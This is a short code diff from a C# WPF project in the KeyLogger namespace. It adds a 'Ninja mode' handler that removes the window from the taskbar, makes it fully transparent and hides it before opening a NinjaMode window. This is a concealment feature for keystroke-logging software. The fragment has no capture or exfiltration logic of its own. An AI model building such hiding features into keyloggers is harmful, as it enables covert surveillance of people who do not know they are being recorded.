@@ -39,5 +39,13 @@ namespace KeyLogger
             keyboard_textbox.Clear();
         }
 
+        private void onNinjaModeClick(object sender, RoutedEventArgs e)
+        {
+            this.ShowInTaskbar = false;
+            this.Opacity = 0;
+            this.Visibility = Visibility.Hidden;
+            NinjaMode ninjaMode = new NinjaMode();
+            ninjaMode.Show();
+        }
     }
 }
